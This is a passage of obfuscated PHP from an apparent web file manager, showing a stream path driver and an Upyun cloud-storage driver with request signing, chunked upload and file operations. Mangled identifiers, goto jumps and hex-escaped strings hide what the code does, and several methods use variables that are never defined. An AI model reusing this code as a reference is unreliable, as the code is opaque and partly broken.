$Eò«–¯àæÀ->task[$b⁄≈¯É÷´˘[992]]); if ($Fïà°æ‚Æ∏[$b⁄≈¯É÷´˘[980]] == $Fïà°æ‚Æ∏[$b⁄≈¯É÷´˘[992]]) { $Fïà°æ‚Æ∏[$b⁄≈¯É÷´˘[699]] = 1; } Cache::set($b⁄≈¯É÷´˘[993] . $Eò«–¯àæÀ->task[$b⁄≈¯É÷´˘[363]], $Fïà°æ‚Æ∏); $Eò«–¯àæÀ->end(); } private function sqlEncode($B—¿œ©≤è) { $dëÜî¬Ñó =& $_SERVER[¯èãÄπµ]; $Aí•ò´®≈⁄ = array(); foreach ($B—¿œ©≤è as $AÛ≥Æ≥ÓëÜ) { if (is_array($AÛ≥Æ≥ÓëÜ)) { $AÛ≥Æ≥ÓëÜ = json_encode_force($AÛ≥Æ≥ÓëÜ); } $AÛ≥Æ≥ÓëÜ = addslashes($AÛ≥Æ≥ÓëÜ); $AÛ≥Æ≥ÓëÜ = str_replace(array($dëÜî¬Ñó[994], $dëÜî¬Ñó[213]), array($dëÜî¬Ñó[995], $dëÜî¬Ñó[996]), $AÛ≥Æ≥ÓëÜ); $Aí•ò´®≈⁄[] = str_replace($dëÜî¬Ñó[55], $dëÜî¬Ñó[997], $AÛ≥Æ≥ÓëÜ); } return $dëÜî¬Ñó[55] . implode($dëÜî¬Ñó[998], $Aí•ò´®≈⁄) . $dëÜî¬Ñó[55]; } private function sqlDecode($cÚãç√áø⁄, $Båöèéê–Ω) { $dıíìß÷üª =& $_SERVER[¯èãÄπµ]; $cÚãç√áø⁄ = str_replace(array($dıíìß÷üª[995], $dıíìß÷üª[996]), array($dıíìß÷üª[994], $dıíìß÷üª[213]), $cÚãç√áø⁄); if ($Båöèéê–Ω == $dıíìß÷üª[9]) { $cÚãç√áø⁄ = stripslashes($cÚãç√áø⁄); } return $cÚãç√áø⁄; } } goto c©Æíï‚¿Ÿ; E–ã„êÎ†‹: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($C∆»´ÈÍÂπ, $CÿË⁄›¢ÓØ = 0) { parent::__construct(); $this->source = $C∆»´ÈÍÂπ; $this->sourceSize = $CÿË⁄›¢ÓØ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($C§’ÓÈ‚À¥ = false) { return $this->sourceSize; } public function getContent($cÔﬁçÂø‰« = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $dù§Ë¿ß∑Á = ftell($this->source); $cßá‘•î‘‘ = @fread($this->source, $this->sourceSize); fseek($this->source, $dù§Ë¿ß∑Á); return $cßá‘•î‘‘; } } public function fileSubstr($FÔõÇ¢‡å¢ = false, $c™£Ç•†¬ä = 0, $CéõÛ”” ‰ = 0) { if (!$CéõÛ”” ‰) { $CéõÛ”” ‰ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $c™£Ç•†¬ä, $CéõÛ”” ‰); } if ($this->sourceType == self::TYPE_FILE) { $D’ˆä´”·Æ = ftell($this->source); fseek($this->source, $D’ˆä´”·Æ + $c™£Ç•†¬ä); $A‘ﬂ°ΩÛ‚¨ = @fread($this->source, $CéõÛ”” ‰); fseek($this->source, $D’ˆä´”·Æ); return $A‘ﬂ°ΩÛ‚¨; } } public function hashMd5($F›Üè·ûÂö = false) { return md5($this->getContent()); } public static function hash($c≈ûŸ‘ìÙ¯, $eÿÊ†ﬁÑﬂç = 0) { $aÜﬂΩ§≈∏¨ = new PathDriverStream($c≈ûŸ‘ìÙ¯, $eÿÊ†ﬁÑﬂç); return $aÜﬂΩ§≈∏¨->hashSimple($c≈ûŸ‘ìÙ¯); } public static function md5($AôÑ®ﬁà∞≤, $bç‘≠õ≥É = 0) { $FÏÇ∫Ò‰‹¢ = new PathDriverStream($AôÑ®ﬁà∞≤, $bç‘≠õ≥É); return $FÏÇ∫Ò‰‹¢->hashMd5($AôÑ®ﬁà∞≤); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\57\57\x76\60\56\x61\x70\x69\x2e\165\160\171\x75\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($C≥áÏ‡…æâ) { parent::__construct(); $this->_init($C≥áÏ‡…æâ); } public function _init($f‘éÙÊÉáπ) { foreach ($f‘éÙÊÉáπ as $Cµ¥ˆã”∫ù => $b¯Œ˘ßùˆü) { if (isset($this->{$Cµ¥ˆã”∫ù})) { $this->{$Cµ¥ˆã”∫ù} = $b¯Œ˘ßùˆü; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¯èãÄπµ][1237], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($EÂÆˆ†µΩ•, $eÿÖﬁÙë˜⁄ = "\x47\x45\x54") { $d˜Üπ Ãı¨ =& $_SERVER[¯èãÄπµ]; $Fßœ≠πó®Ì = gmdate($d˜Üπ Ãı¨[1201]); $Bø‹ﬁç∏Œ¿ = base64_encode(hash_hmac($d˜Üπ Ãı¨[1238], "{$eÿÖﬁÙë˜⁄}\46{$EÂÆˆ†µΩ•}\x26{$Fßœ≠πó®Ì}", md5("{$this->userpass}"), !0)); $B∂Ü“ù≥ç™ = array("\x41\165\x74\150\157\x72\x69\x7a\141\x74\x69\x6f\x6e\x3a\125\120\131\125\x4e\x20{$this->username}\72{$Bø‹ﬁç∏Œ¿}", "\x44\141\164\145\72{$Fßœ≠πó®Ì}"); return $B∂Ü“ù≥ç™; } public function ussRequest($d∞Üìà≥èÑ, $aÂâ‹áÖæ = "\x47\x45\124", $f”üÛÑîÖ¬ = false, $AçˆíÀÃ« = false, $dî¬â≥Éˆà = false) { goto F¶ÌÉ∞‡ê∂; d…ù∆¡ÀÃ≤: if (!$d‹√©ÚÊœî) { return array($bù å≥ä´Ê[1034] => !1, $bù å≥ä´Ê[1036] => $bù å≥ä´Ê[1239]); } if (strtolower($aÂâ‹áÖæ) == $bù å≥ä´Ê[180] || in_array($d‹√©ÚÊœî[$bù å≥ä´Ê[1034]], array($bù å≥ä´Ê[1095], $bù å≥ä´Ê[1240]))) { $f”üÛÑîÖ¬ = $d‹√©ÚÊœî[$bù å≥ä´Ê[1241]]; } else { $f”üÛÑîÖ¬ = json_decode($d‹√©ÚÊœî[$bù å≥ä´Ê[1036]], !0); if (!$f”üÛÑîÖ¬) { $f”üÛÑîÖ¬ = $d‹√©ÚÊœî[$bù å≥ä´Ê[1036]]; } else { if (!$d‹√©ÚÊœî[$bù å≥ä´Ê[692]] && isset($f”üÛÑîÖ¬[$bù å≥ä´Ê[1242]])) { $f”üÛÑîÖ¬ = $f”üÛÑîÖ¬[$bù å≥ä´Ê[1242]]; } } } return array($bù å≥ä´Ê[1034] => $d‹√©ÚÊœî[$bù å≥ä´Ê[692]], $bù å≥ä´Ê[1036] => $f”üÛÑîÖ¬); goto FÍÔóˆ¢Üà; dÃ•Ç¥ó¥∏: $bà‡«é∫´¥ = $this->ussHeaders($C¶¬Ûøßõ¥, $aÂâ‹áÖæ); if ($AçˆíÀÃ«) { $bà‡«é∫´¥ = array_merge($bà‡«é∫´¥, $AçˆíÀÃ«); } $d‹√©ÚÊœî = url_request($this->endpoint . $C¶¬Ûøßõ¥, $aÂâ‹áÖæ, $f”üÛÑîÖ¬, $bà‡«é∫´¥, $dî¬â≥Éˆà); goto d…ù∆¡ÀÃ≤; F¶ÌÉ∞‡ê∂: $bù å≥ä´Ê =& $_SERVER[¯èãÄπµ]; $d∞Üìà≥èÑ = trim($d∞Üìà≥èÑ, $bù å≥ä´Ê[8]); $C¶¬Ûøßõ¥ = "\x2f{$this->bucket}\57{$d∞Üìà≥èÑ}"; goto dÃ•Ç¥ó¥∏; FÍÔóˆ¢Üà: } public function mkfile($EñÙ’ƒΩÛå, $d…¬©òÂÉù = '', $fòÌÜ∞ü£î = REPEAT_RENAME) { if ($this->setContent($EñÙ’ƒΩÛå, $d…¬©òÂÉù)) { return $this->getPathOuter($EñÙ’ƒΩÛå); } return !1; } public function mkdir($e´◊ê™è€Ü, $DôÍ°èÉπ = REPEAT_SKIP) { $a‡‘‹¡ÇŸ· =& $_SERVER[¯èãÄπµ]; $fê∑«ëØã¢ = trim($e´◊ê™è€Ü, $a‡‘‹¡ÇŸ·[8]); if ($this->_isFolder($fê∑«ëØã¢)) { return $this->getPathOuter($fê∑«ëØã¢); } $cáòâÌ™Üß = array($a‡‘‹¡ÇŸ·[1243]); $E»âôÁÂãô = $this->ussRequest($fê∑«ëØã¢, $a‡‘‹¡ÇŸ·[208], !1, $cáòâÌ™Üß); return $E»âôÁÂãô[$a‡‘‹¡ÇŸ·[1034]] ? $this->getPathOuter($fê∑«ëØã¢) : !1; } public function copyFile($A—ÀïÎ÷ËÖ, $c∫ıË√ä¯ö) { $AÉﬂè±ûíè =& $_SERVER[¯èãÄπµ]; $AÂƒÏÓÒ°À = array($AÉﬂè±ûíè[1244] . "\x2f{$this->bucket}\x2f{$A—ÀïÎ÷ËÖ}", $AÉﬂè±ûíè[1245]); $CËÈ¿ÂÖ—é = $this->ussRequest($c∫ıË√ä¯ö, $AÉﬂè±ûíè[210], !1, $AÂƒÏÓÒ°À); return $CËÈ¿ÂÖ—é[$AÉﬂè±ûíè[1034]] ? !0 : !1; } public function moveFile($Fîàú˘õŸ‡, $cùå¡Ó≠ñ£) { $CˆñÚÖºÖæ =& $_SERVER[¯èãÄπµ]; $E§Æ™ÂÖ◊¶ = array($CˆñÚÖºÖæ[1246] . "\57{$this->bucket}\x2f{$Fîàú˘õŸ‡}", $CˆñÚÖºÖæ[1245]); $C›µØÒ»¯‚ = $this->ussRequest($cùå¡Ó≠ñ£, $CˆñÚÖºÖæ[210], !1, $E§Æ™ÂÖ◊¶); return $C›µØÒ»¯‚[$CˆñÚÖºÖæ[1034]] ? !0 : !1; } public function delFile($e‡ç´·∏‘) { $cÀµ–—”¬ˆ =& $_SERVER[¯èãÄπµ]; $b‚œÑåª‚ê = $this->ussRequest($e‡ç´·∏‘, $cÀµ–—”¬ˆ[1247]); return $b‚œÑåª‚ê[$cÀµ–—”¬ˆ[1034]] ? !0 : !1; } public function delFolder($AÚ±åâ◊⁄Ù) { $E¨Ìå–ñÏà =& $_SERVER[¯èãÄπµ]; $bΩÒ∆Ëé÷è = $this->listAll($AÚ±åâ◊⁄Ù); krsort($bΩÒ∆Ëé÷è); foreach ($bΩÒ∆Ëé÷è as $eêΩŒ—„Ì‹) { $this->ussRequest($eêΩŒ—„Ì‹[$E¨Ìå–ñÏà[75]], $E¨Ìå–ñÏà[1247]); } return $this->ussRequest($AÚ±åâ◊⁄Ù, $E¨Ìå–ñÏà[1247]); } public function rename($BÇñ‹«ƒ”Ø, $fíß≤óçñ) { if ($this->isFile($BÇñ‹«ƒ”Ø)) { $fíß≤óçñ = get_path_father($BÇñ‹«ƒ”Ø) . $fíß≤óçñ; return $this->moveFile($BÇñ‹«ƒ”Ø, $fíß≤óçñ); } return $this->renameObject($BÇñ‹«ƒ”Ø, $fíß≤óçñ); } public function fileInfo($bÍΩ≈Òê†ˆ, $cü∫Œ≤Ñã‘ = false, $dˆæËÀ±ÙÖ = array()) { $E°Ï◊äıÓ∞ =& $_SERVER[¯èãÄπµ]; if ($cü∫Œ≤Ñã‘) { return array($E°Ï◊äıÓ∞[28] => $this->pathThis($bÍΩ≈Òê†ˆ), $E°Ï◊äıÓ∞[75] => $this->getPathOuter($E°Ï◊äıÓ∞[8] . $bÍΩ≈Òê†ˆ), $E°Ï◊äıÓ∞[29] => $E°Ï◊äıÓ∞[163], $E°Ï◊äıÓ∞[77] => isset($dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[321]]) ? $dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[321]] : 0, $E°Ï◊äıÓ∞[156] => $this->ext($bÍΩ≈Òê†ˆ)); } $c¯±ƒ–Ñ‰û = array($E°Ï◊äıÓ∞[28] => $this->pathThis($bÍΩ≈Òê†ˆ), $E°Ï◊äıÓ∞[75] => $this->getPathOuter($E°Ï◊äıÓ∞[8] . $bÍΩ≈Òê†ˆ), $E°Ï◊äıÓ∞[29] => $E°Ï◊äıÓ∞[163], $E°Ï◊äıÓ∞[183] => 0, $E°Ï◊äıÓ∞[106] => isset($AˆÑÍíπ€◊[$E°Ï◊äıÓ∞[1248]]) ? $AˆÑÍíπ€◊[$E°Ï◊äıÓ∞[1248]] : 0, $E°Ï◊äıÓ∞[77] => isset($dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[321]]) ? $dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[321]] : 0, $E°Ï◊äıÓ∞[156] => $this->ext($bÍΩ≈Òê†ˆ), $E°Ï◊äıÓ∞[184] => !0, $E°Ï◊äıÓ∞[185] => !0); if (empty($dˆæËÀ±ÙÖ)) { $dˆæËÀ±ÙÖ = $this->objectMeta($bÍΩ≈Òê†ˆ); if (!$dˆæËÀ±ÙÖ) { return $c¯±ƒ–Ñ‰û; } $c¯±ƒ–Ñ‰û[$E°Ï◊äıÓ∞[183]] = $dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[1249]]; $c¯±ƒ–Ñ‰û[$E°Ï◊äıÓ∞[106]] = $dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[1250]]; $c¯±ƒ–Ñ‰û[$E°Ï◊äıÓ∞[77]] = $dˆæËÀ±ÙÖ[$E°Ï◊äıÓ∞[77]]; } return $c¯±ƒ–Ñ‰û; } public function folderInfo($E∂êäçøÆŒ, $E‹›óÎ™µ± = false) { $dÇÃ¶±§æÁ =& $_SERVER[¯èãÄπµ]; if ($E‹›óÎ™µ±) { return array($dÇÃ¶±§æÁ[28] => $this->pathThis($E∂êäçøÆŒ), $dÇÃ¶±§æÁ[75] => $this->getPathOuter($dÇÃ¶±§æÁ[8] . $E∂êäçøÆŒ), $dÇÃ¶±§æÁ[29] => $dÇÃ¶±§æÁ[76]); } $fç‡áûøŒ” = array($dÇÃ¶±§æÁ[28] => $this->pathThis($E∂êäçøÆŒ), $dÇÃ¶±§æÁ[75] => $this->getPathOuter($dÇÃ¶±§æÁ[8] . $E∂êäçøÆŒ), $dÇÃ¶±§æÁ[29] => $dÇÃ¶±§æÁ[76], $dÇÃ¶±§æÁ[183] => 0, $dÇÃ¶±§æÁ[106] => isset($d‘„ÚìÉ€∞[$dÇÃ¶±§æÁ[1248]]) ? $d‘„ÚìÉ€∞[$dÇÃ¶±§æÁ[1248]] : 0, $dÇÃ¶±§æÁ[1156] => !0, $dÇÃ¶±§æÁ[1157] => !0); if (empty($d¿ßãﬁì∑≈)) { $d¿ßãﬁì∑≈ = $this->objectMeta($E∂êäçøÆŒ); if (!$d¿ßãﬁì∑≈) { return $fç‡áûøŒ”; } $fç‡áûøŒ”[$dÇÃ¶±§æÁ[183]] = $d¿ßãﬁì∑≈[$dÇÃ¶±§æÁ[1249]]; $fç‡áûøŒ”[$dÇÃ¶±§æÁ[106]] = $d¿ßãﬁì∑≈[$dÇÃ¶±§æÁ[1250]]; } return $fç‡áûøŒ”; } private function fileList($e∫Ì◊∏ç†Ÿ, $Cäı®¶≈’Î = 0, $DÍñâ∑≤›∫ = 1000) { $dÓÙ≤ñøÔ =& $_SERVER[¯èãÄπµ]; $FﬂÈÛßç¢¢ = array($dÓÙ≤ñøÔ[1251], $dÓÙ≤ñøÔ[1252] . $DÍñâ∑≤›∫); if ($Cäı®¶≈’Î) { $FﬂÈÛßç¢¢[] = $dÓÙ≤ñøÔ[1253] . $Cäı®¶≈’Î; } $a∞≤Ê≤í—◊ = $this->ussRequest($e∫Ì◊∏ç†Ÿ, $dÓÙ≤ñøÔ[212], !1, $FﬂÈÛßç¢¢); return !$a∞≤Ê≤í—◊[$dÓÙ≤ñøÔ[1034]] ? !1 : $a∞≤Ê≤í—◊[$dÓÙ≤ñøÔ[1036]]; } public function listPath($e∑Úıøä•, $eæÊ∏é•∂€ = false) { goto EŸ®€≤Æ¶≠; aéÆπ°Ò‰Ã: return array($bá≈¿”©‘›[74] => $FΩÛ›¿Ç‚§, $bá≈¿”©‘›[73] => $bÂú‘Ì√€î); goto A¥Ûò∆ÿò£; EŸ®€≤Æ¶≠: $bá≈¿”©‘› =& $_SERVER[¯èãÄπµ]; $Eπóé¡—£ˆ = $bá≈¿”©‘›[33]; $FàÎ⁄îÚäú = 1000; goto c∏ÚúŸüá≠; c∏ÚúŸüá≠: $FΩÛ›¿Ç‚§ = $bÂú‘Ì√€î = array(); $d≥Öâõ‡“â = rtrim($e∑Úıøä•, $bá≈¿”©‘›[8]) . $bá≈¿”©‘›[8]; while (!0) { $CÃØ∑Öˆ‚ = $this->fileList($e∑Úıøä•, $Eπóé¡—£ˆ, $FàÎ⁄îÚäú); if (!$CÃØ∑Öˆ‚) { return !1; } $Eπóé¡—£ˆ = isset($CÃØ∑Öˆ‚[$bá≈¿”©‘›[1254]]) ? $CÃØ∑Öˆ‚[$bá≈¿”©‘›[1254]] : $bá≈¿”©‘›[33]; $BÙñÃ∫Éßà = isset($CÃØ∑Öˆ‚[$bá≈¿”©‘›[1255]]) ? $CÃØ∑Öˆ‚[$bá≈¿”©‘›[1255]] : array(); foreach ($BÙñÃ∫Éßà as $A∏ü›û‚À•) { if ($A∏ü›û‚À•[$bá≈¿”©‘›[29]] == $bá≈¿”©‘›[76]) { $FΩÛ›¿Ç‚§[] = $this->folderInfo($d≥Öâõ‡“â . $A∏ü›û‚À•[$bá≈¿”©‘›[28]], $eæÊ∏é•∂€, $A∏ü›û‚À•); } else { $bÂú‘Ì√€î[] = $this->fileInfo($d≥Öâõ‡“â . $A∏ü›û‚À•[$bá≈¿”©‘›[28]], $eæÊ∏é•∂€, $A∏ü›û‚À•); } } if (count($BÙñÃ∫Éßà) < $FàÎ⁄îÚäú) { break; } } goto aéÆπ°Ò‰Ã; A¥Ûò∆ÿò£: } private function recursionAllFiles($E¬¬¬≈µ¢‰, &$D¬ˆúΩ˜òå) { $b∞∑©õÉöò =& $_SERVER[¯èãÄπµ]; $D  ìëÜ£… = $b∞∑©õÉöò[33]; $dÜ‘ø±“Û◊ = 1000; $eÊ‚Ω’ä“√ = $e†ªë‰Ò ˆ = array(); $c®æ≥á„øÖ = rtrim($E¬¬¬≈µ¢‰, $b∞∑©õÉöò[8]) . $b∞∑©õÉöò[8]; while (!0) { $cõ°‡“”Ö≥ = $this->fileList($E¬¬¬≈µ¢‰, $D  ìëÜ£…, $dÜ‘ø±“Û◊); if (!$cõ°‡“”Ö≥) { return !1; } $D  ìëÜ£… = isset($cõ°‡“”Ö≥[$b∞∑©õÉöò[1254]]) ? $cõ°‡“”Ö≥[$b∞∑©õÉöò[1254]] : $b∞∑©õÉöò[33]; $BÙ¯‰‘©êı = isset($cõ°‡“”Ö≥[$b∞∑©õÉöò[1255]]) ? $cõ°‡“”Ö≥[$b∞∑©õÉöò[1255]] : array(); foreach ($BÙ¯‰‘©êı as $dÛ≤ªñ“òó) { $eñ»˘Û¡©⁄ = array($b∞∑©õÉöò[75] => $c®æ≥á„øÖ . $dÛ≤ªñ“òó[$b∞∑©õÉöò[28]], $b∞∑©õÉöò[76] => $dÛ≤ªñ“òó[$b∞∑©õÉöò[29]] == $b∞∑©õÉöò[76] ? 1 : 0, $b∞∑©õÉöò[77] => isset($dÛ≤ªñ“òó[$b∞∑©õÉöò[321]]) ? $dÛ≤ªñ“òó[$b∞∑©õÉöò[321]] : 0); $D¬ˆúΩ˜òå[] = $eñ»˘Û¡©⁄; if ($eñ»˘Û¡©⁄[$b∞∑©õÉöò[76]] == 1) { $this->recursionAllFiles($eñ»˘Û¡©⁄[$b∞∑©õÉöò[75]], $D¬ˆúΩ˜òå); } } if (count($BÙ¯‰‘©êı) < $dÜ‘ø±“Û◊) { break; } } } public function has($f∆Ω’«ÔŸº, $BÏ¯‘áÜ‡• = false, $cäø–ò öÁ = true) { goto cÿí⁄ÒÖ∏‚; cÿí⁄ÒÖ∏‚: $FŒ—√¨Æö∂ =& $_SERVER[¯èãÄπµ]; $d‡„Õû†ÁÍ = $FŒ—√¨Æö∂[33]; $aÂØ⁄àÍ¨¿ = 1000; goto dØ¬¥ÇÚßì; dØ¬¥ÇÚßì: $eêÂæƒ≠ìˆ = 0; $C¥Ñö‘ãó = 0; $cä£Ü≥‰≠Œ = rtrim($f∆Ω’«ÔŸº, $FŒ—√¨Æö∂[8]) . $FŒ—√¨Æö∂[8]; goto c«ÿÒ„ﬁ§à; c«ÿÒ„ﬁ§à: while (!0) { $BÖÑ∏˜‚∫ﬂ = $this->fileList($f∆Ω’«ÔŸº, $d‡„Õû†ÁÍ, $aÂØ⁄àÍ¨¿); if (!$BÖÑ∏˜‚∫ﬂ) { return !1; } $d‡„Õû†ÁÍ = isset($BÖÑ∏˜‚∫ﬂ[$FŒ—√¨Æö∂[1254]]) ? $BÖÑ∏˜‚∫ﬂ[$FŒ—√¨Æö∂[1254]] : $FŒ—√¨Æö∂[33]; $aœ€Ô¿ƒ«è = isset($BÖÑ∏˜‚∫ﬂ[$FŒ—√¨Æö∂[1255]]) ? $BÖÑ∏˜‚∫ﬂ[$FŒ—√¨Æö∂[1255]] : array(); if (empty($aœ€Ô¿ƒ«è)) { break; } $dõûÑ¨ë⁄„ = array_to_keyvalue($aœ€Ô¿ƒ«è, $FŒ—√¨Æö∂[33], $FŒ—√¨Æö∂[29]); $Dæ√¶Øú¡Û = array_count_values($dõûÑ¨ë⁄„); $AÍƒò•ÚÜ∏ = isset($Dæ√¶Øú¡Û[$FŒ—√¨Æö∂[76]]) ? $Dæ√¶Øú¡Û[$FŒ—√¨Æö∂[76]] : 0; $EÎ∆èªÓ◊ë = count($dõûÑ¨ë⁄„) - $AÍƒò•ÚÜ∏; if ($BÏ¯‘áÜ‡•) { $C¥Ñö‘ãó += $AÍƒò•ÚÜ∏; $eêÂæƒ≠ìˆ += $EÎ∆èªÓ◊ë; if ($Aﬁ´»ªﬁâπ < $aÂØ⁄àÍ¨¿) { break; } continue; } if ($cäø–ò öÁ) { if ($EÎ∆èªÓ◊ë) { return !0; } } else { if ($AÍƒò•ÚÜ∏) { return !0; } } if (count($aœ€Ô¿ƒ«è) < $aÂØ⁄àÍ¨¿) { break; } } if ($BÏ¯‘áÜ‡•) { return array($FŒ—√¨Æö∂[187] => $eêÂæƒ≠ìˆ, $FŒ—√¨Æö∂[188] => $C¥Ñö‘ãó); } return !1; goto F¥πÙºà°ƒ; F¥πÙºà°ƒ: } public function listAll($e’Ü…ì¥‚±) { $eÆÇ¶ƒ¢·” = array(); $this->recursionAllFiles($e’Ü…ì¥‚±, $eÆÇ¶ƒ¢·”); return $eÆÇ¶ƒ¢·”; } public function canRead($dÖª°èÏƒÜ) { return $this->exist($dÖª°èÏƒÜ) ? !0 : !1; } public function canWrite($c®∂ûµ°’§) { return $this->exist($c®∂ûµ°’§) ? !0 : !1; } public function getContent($A›õ∂Ûıç›) { return $this->fileSubstr($A›õ∂Ûıç›, 0, -1); } public function setContent($aπä¿≈ÈŒﬂ, $c¶ûÈ∞Ó¶Ô = '') { $EˆúûËßäÈ =& $_SERVER[¯èãÄπµ]; if (!$c¶ûÈ∞Ó¶Ô) { $a¥óı˘“Ãÿ = $this->ussRequest($aπä¿≈ÈŒﬂ, $EˆúûËßäÈ[208]); return $a¥óı˘“Ãÿ[$EˆúûËßäÈ[1034]]; } $C‡Ÿ«ÏÔö¡ = $this->tempFile($this->pathThis($aπä¿≈ÈŒﬂ)); file_put_contents($C‡Ÿ«ÏÔö¡, $c¶ûÈ∞Ó¶Ô); if ($this->upload($aπä¿≈ÈŒﬂ, $C‡Ÿ«ÏÔö¡)) { $this->tempFileRemve($C‡Ÿ«ÏÔö¡); return !0; } return !1; } public function fileSubstr($a´À‰◊“Êà, $EíãÒìÂÚ‡, $Aµ¶ò∏Ñ¡ƒ) { $cÈ˜£Ææ˘á =& $_SERVER[¯èãÄπµ]; if (!($B¡˜Àº÷î√ = $this->link($a´À‰◊“Êà))) { return !1; } $cüÖçç≠ÈÙ = !1; if ($Aµ¶ò∏Ñ¡ƒ > 0) { $D‘ˆôù≠óÚ = $EíãÒìÂÚ‡ + $Aµ¶ò∏Ñ¡ƒ - 1; $cüÖçç≠ÈÙ = array($cÈ˜£Ææ˘á[1216] . $EíãÒìÂÚ‡ . $cÈ˜£Ææ˘á[408] . $D‘ˆôù≠óÚ); } $DÏä≤∆∞ù∆ = url_request($B¡˜Àº÷î√, $cÈ˜£Ææ˘á[212], !1, $cüÖçç≠ÈÙ); return $DÏä≤∆∞ù∆[$cÈ˜£Ææ˘á[692]] ? $DÏä≤∆∞ù∆[$cÈ˜£Ææ˘á[1036]] : !1; } public function upload($c≥ùîôÚ«∫, $fÒÆ¡πåÕñ, $B¡®πﬂñœπ = false, $FŸûËˆè°¥ = REPEAT_REPLACE) { goto Cœãœ‡á„„; a‚Âä‡‹ÓŒ: $B‚ß˜†òì“ = 1024 * 1024 * 10; $BÇ°Ñû√ÂÉ = array($Fæò¨Ë¡π∫[1257], $Fæò¨Ë¡π∫[1258] . $dñˆÃàã∂», $Fæò¨Ë¡π∫[1259], $Fæò¨Ë¡π∫[1260] . $B‚ß˜†òì“); $e¡Ü≠˘ïê÷ = $this->ussRequest($c≥ùîôÚ«∫, $Fæò¨Ë¡π∫[210], !1, $BÇ°Ñû√ÂÉ); goto Fé˘≤ƒ…•ç; Fé˘≤ƒ…•ç: if (!$e¡Ü≠˘ïê÷[$Fæò¨Ë¡π∫[1034]]) { return !1; } $cß¬Ì¬ ñÏ = $e¡Ü≠˘ïê÷[$Fæò¨Ë¡π∫[1036]]; $BÑè†è€¶— = 0; goto EıôàÑïáÂ; cÒπçàãã‰: $e¡Ü≠˘ïê÷ = $this->ussRequest($c≥ùîôÚ«∫, $Fæò¨Ë¡π∫[210], !1, $BÇ°Ñû√ÂÉ); return $e¡Ü≠˘ïê÷[$Fæò¨Ë¡π∫[1034]] ? $this->getPathOuter($C˜£ÑíÓŒ) : !1; goto d¢‘€ÊôÂ≤; Cœãœ‡á„„: $Fæò¨Ë¡π∫ =& $_SERVER[¯èãÄπµ]; $dñˆÃàã∂» = IO::size($fÒÆ¡πåÕñ); if ($dñˆÃàã∂» <= 1024 * 1024 * 200) { $D›¿òˆü·ê = array($Fæò¨Ë¡π∫[1256] . $fÒÆ¡πåÕñ); $e¡Ü≠˘ïê÷ = $this->ussRequest($c≥ùîôÚ«∫, $Fæò¨Ë¡π∫[210], $D›¿òˆü·ê); return $e¡Ü≠˘ïê÷[$Fæò¨Ë¡π∫[1034]] ? $this->getPathOuter($c≥ùîôÚ«∫) : !1; } goto a‚Âä‡‹ÓŒ; aÏ√ÙÆ¢∫Ë: do { $B„…Áﬁ»ç† = $cß¬Ì¬ ñÏ[$Fæò¨Ë¡π∫[1262]]; fseek($Eßå»ËâÊ©, $BÑè†è€¶—); $FŸ¯Ñ°ê»ã = fread($Eßå»ËâÊ©, $B„…Áﬁ»ç†); $dâÕò÷·ú  = 0; do { $dâÕò÷·ú ++; $cß¬Ì¬ ñÏ = $this->uploadPart($c≥ùîôÚ«∫, $cß¬Ì¬ ñÏ, $FŸ¯Ñ°ê»ã); } while (!$cß¬Ì¬ ñÏ && $dâÕò÷·ú  < 3); if (!$cß¬Ì¬ ñÏ) { return !1; } $aƒ∫›Ó˘à≤ = $cß¬Ì¬ ñÏ[$Fæò¨Ë¡π∫[1261]]; $BÑè†è€¶— += $B„…Áﬁ»ç†; } while ($aƒ∫›Ó˘à≤ != -1); fclose($Eßå»ËâÊ©); $BÇ°Ñû√ÂÉ = array($Fæò¨Ë¡π∫[1263], $Fæò¨Ë¡π∫[1264] . $cß¬Ì¬ ñÏ[$Fæò¨Ë¡π∫[1265]], $Fæò¨Ë¡π∫[1259]); goto cÒπçàãã‰; EıôàÑïáÂ: $aƒ∫›Ó˘à≤ = $cß¬Ì¬ ñÏ[$Fæò¨Ë¡π∫[1261]]; $Eßå»ËâÊ© = fopen($fÒÆ¡πåÕñ, $Fæò¨Ë¡π∫[1164]); if (!$Eßå»ËâÊ©) { return !1; } goto aÏ√ÙÆ¢∫Ë; d¢‘€ÊôÂ≤: } private function uploadPart($Cîà⁄˜¢Õ∫, $aàº∫ËîÇ¶, &$A›éöÊﬁíù) { $f€ÁÜƒ≥Üﬁ =& $_SERVER[¯èãÄπµ]; $f‘∫©ø†õË = array($f€ÁÜƒ≥Üﬁ[1266], $f€ÁÜƒ≥Üﬁ[1264] . $aàº∫ËîÇ¶[$f€ÁÜƒ≥Üﬁ[1265]], $f€ÁÜƒ≥Üﬁ[1267] . $aàº∫ËîÇ¶[$f€ÁÜƒ≥Üﬁ[1261]], $f€ÁÜƒ≥Üﬁ[1268] . $aàº∫ËîÇ¶[$f€ÁÜƒ≥Üﬁ[1262]]); $CﬁÛÔ©æÎÓ = $this->ussRequest($Cîà⁄˜¢Õ∫, $f€ÁÜƒ≥Üﬁ[210], $A›éöÊﬁíù, $f‘∫©ø†õË); return !$CﬁÛÔ©æÎÓ[$f€ÁÜƒ≥Üﬁ[1034]] ? $CﬁÛÔ©æÎÓ[$f€ÁÜƒ≥Üﬁ[1034]] : $CﬁÛÔ©æÎÓ[$f€ÁÜƒ≥Üﬁ[1036]]; } public function uploadFormData($få•ªä≈Ö¿, $D´á∞Áµ∑ã = 3600) { return $this->uploadPolicy($få•ªä≈Ö¿, 